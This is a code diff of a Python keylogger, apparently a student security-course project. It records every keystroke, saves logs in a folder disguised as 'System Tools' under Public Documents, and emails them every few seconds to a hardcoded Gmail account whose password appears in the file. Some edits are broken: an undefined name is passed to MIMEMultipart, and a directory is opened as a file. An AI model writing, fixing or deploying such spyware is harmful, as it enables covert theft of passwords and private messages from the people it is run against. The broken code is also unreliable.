@@ -1,21 +1,19 @@
+import os
+
 import keyboard
 import smtplib
-import sys
-import ast
-import mimetypes
 
 from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
+from email.mime.application import MIMEApplication
 from email import encoders
-from email.message import Message
-from email.mime.text import MIMEText
 
 from threading import Timer
 from datetime import datetime
 
-REPORT_INTERVAL = 10
+REPORT_INTERVAL = 6
 EMAILA = "cmsc414BH@gmail.com"  # address of burner account to receive reports
-EMAILP = "P@$$word"             # password for burner account
+EMAILP = "P@$$word"  # password for burner account
 
 
 class Keylogger:
@@ -24,19 +22,19 @@ class Keylogger:
     # Initialize keylogger object
     # **************************
     def __init__(self):
-        self.filename = None                # inits filename
-        self.interval = REPORT_INTERVAL     # how long in sec between txt file creation
-        self.log = ""                       # creates an empty log to hold keystrokes
-        self.startDate = datetime.now()     # inits start and end dates to be used in filename
+        self.filename = None  # inits filename
+        self.interval = REPORT_INTERVAL  # how long in sec between txt file creation
+        self.log = ""  # creates an empty log to hold keystrokes
+        self.startDate = datetime.now()  # inits start and end dates to be used in filename
         self.endDate = datetime.now()
 
     # **************************
     # begins cycle of keystroke logging for each key pressed
     # **************************
     def start(self):
-        self.startDate = datetime.now()             # initializes start date for file name
-        keyboard.on_release(callback=self.keyLog)   # runs logger for each keystroke pressed
-        self.report()                               # report logs
+        self.startDate = datetime.now()  # initializes start date for file name
+        keyboard.on_release(callback=self.keyLog)  # runs logger for each keystroke pressed
+        self.report()  # report logs
         keyboard.wait()
 
     # **************************
@@ -44,14 +42,14 @@ class Keylogger:
     # **************************
     def report(self):
         """Called every interval"""
-        if self.log:                        # Report any amount of data in the log
-            self.endDate = datetime.now()   # add finished timestamp for appending to filename
-            self.updateFilename()           # final update to filename before saving/sending
-            self.writeFile()                # write current log contents to file
-            self.report_mail()              # send current log contents as email
-            print(f"[{self.filename}] - {self.log}")    # output filename of processed report
-            self.startDate = datetime.now()             # reset start time for next filename
-        self.log = ""                       # clear log for next interval
+        if self.log:  # Report any amount of data in the log
+            self.endDate = datetime.now()  # add finished timestamp for appending to filename
+            self.updateFilename()  # final update to filename before saving/sending
+            self.writeFile()  # write current log contents to file
+            self.report_mail()  # send current log contents as email
+            print(f"[{self.filename}] - {self.log}")  # output filename of processed report
+            self.startDate = datetime.now()  # reset start time for next filename
+        self.log = ""  # clear log for next interval
         timer = Timer(interval=self.interval, function=self.report)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
@@ -87,9 +85,9 @@ class Keylogger:
                     key = ')'
                 else:
                     key = ""
-            if key == "space":      # alternative to report printing "space"
+            if key == "space":  # alternative to report printing "space"
                 key = " "
-            elif key == "enter":    # adds new line to report when [ENTER] is pressed
+            elif key == "enter":  # adds new line to report when [ENTER] is pressed
                 key = "[ENTER]\n"
             elif key == "decimal":  # alternative to printing "[DECIMAL]"
                 key = "."
@@ -110,29 +108,36 @@ class Keylogger:
     # Write current logged data to txt file
     # **************************
     def writeFile(self):
-        with open(f"c:\\{self.filename}", "w") as f:
+        path_exists = os.path.exists('C:\\Users\\Public\\Public Documents\\System Tools')
+        print(path_exists)
+        if not path_exists:
+            print("Creating path\n")
+            os.makedirs('C:\\Users\\Public\\Public Documents\\System Tools')
+        with open(f"C:\\Users\\Public\\Public Documents\\System Tools\\{self.filename}", "w") as f:
             print(self.log, file=f)
-        print(
-            f"[+] Saved G:\\My Drive\\CMSC 414\\Project\\keylogger reports\\{self.filename}")  # confirm file-write
+        print(f"[+] Saved C:\\Users\\Public\\Public Documents\\System Tools\\{self.filename}")  # confirm file-write
 
     # **************************
     # sends report as email
     # **************************
     def report_mail(self):
-        msg = MIMEMultipart()
+        msg = MIMEMultipart(mixed)
         msg['From'] = EMAILA
         msg['To'] = EMAILA
         msg['Subject'] = self.filename
         part = MIMEBase('application', 'octet-stream')
-        part.set_payload(open(self.filename, "rb").read())
+        part.set_payload(self.log)
         encoders.encode_base64(part)
+        path = 'C:\\Users\\Public\\Public Documents\\System Tools\\'
+        with open(path, "rb") as attachment:
+            a = MIMEApplication(attachment.read(), subtype='txt')
 
-        msg.attach(part)
+        msg.attach(a)
         server = smtplib.SMTP(host="smtp.gmail.com", port=587)  # connect to email SMTP server
-        server.starttls()                                       # starts TLS mode
-        server.login(EMAILA, EMAILP)                                 # logs in to burner email account
-        server.sendmail(EMAILA, EMAILA, msg.as_string())                      # sends mail to itself
-        server.quit()                                           # disconnects from SMTP server
+        server.starttls()  # starts TLS mode
+        server.login(EMAILA, EMAILP)  # logs in to burner email account
+        server.sendmail(EMAILA, EMAILA, msg.as_string())  # sends mail to itself
+        server.quit()  # disconnects from SMTP server
 
 
 # **************************
@@ -141,3 +146,5 @@ class Keylogger:
 if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.start()
+
+# one more try
